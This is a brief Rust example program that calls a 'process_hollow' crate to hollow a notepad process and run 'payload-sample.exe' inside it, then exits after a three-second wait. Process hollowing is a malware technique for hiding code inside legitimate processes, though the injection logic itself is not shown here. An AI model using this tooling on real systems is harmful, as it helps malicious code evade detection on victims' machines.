extern crate process_hollow;

use anyhow::*;

fn main() -> Result<()> {
    unsafe { process_hollow::hollow("payload-sample.exe", "notepad")? };
    println!("Exit after 3secs...");
    std::thread::sleep(std::time::Duration::from_millis(3000));
    Ok(())
}
